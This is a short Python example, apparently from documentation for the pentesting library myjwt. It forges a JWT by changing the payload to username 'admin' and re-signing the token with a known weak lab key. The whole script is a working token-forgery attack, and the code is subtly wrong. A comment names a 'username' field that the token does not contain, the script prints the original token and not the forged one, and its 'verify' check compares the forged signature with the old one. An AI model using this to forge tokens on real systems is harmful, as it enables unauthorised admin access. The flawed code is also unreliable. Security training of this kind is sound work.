from myjwt.modify_jwt import change_payload
from myjwt.modify_jwt import signature
from myjwt.utils import jwt_to_json
from myjwt.variables import INVALID_SIGNATURE
from myjwt.variables import VALID_SIGNATURE

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
key = "pentesterlab"
# "header" = {"typ": "JWT", "alg": "HS256"}
# "payload" = {"username": null}
# "signature" = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
jwtJson = jwt_to_json(jwt)
jwtJson = change_payload(jwtJson, {"username": "admin"})
# "header" = {"typ": "JWT", "alg": "HS256"}
# "payload" = {"username": "admin"}
# "signature" = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
new_jwt = signature(jwtJson, key)
print(jwt)

# verify your jwt
print(
    (
        VALID_SIGNATURE
        if new_jwt.split(".")[2] == jwt.split(".")[2]
        else INVALID_SIGNATURE
    ),
)
